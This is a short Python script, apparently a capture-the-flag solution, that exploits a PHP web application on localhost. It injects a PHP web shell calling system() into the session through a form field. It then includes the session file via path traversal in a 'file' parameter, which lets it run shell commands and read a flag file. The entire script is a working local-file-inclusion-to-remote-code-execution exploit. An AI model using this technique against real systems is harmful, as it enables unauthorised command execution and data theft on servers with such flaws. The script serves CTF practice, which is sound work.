import requests
import re
s = requests.Session()
s.post("http://localhost/index.php",{'name': '<?php echo system($_GET["cmd"]); ?>'})
r = s.get("http://localhost/index.php?file=../../../../var/lib/php/sessions/sess_{}&cmd=cat%20/flag_is_here/flag.txt".format(s.cookies['PHPSESSID']))
print(re.search("gigem{.*?}",r.text).group())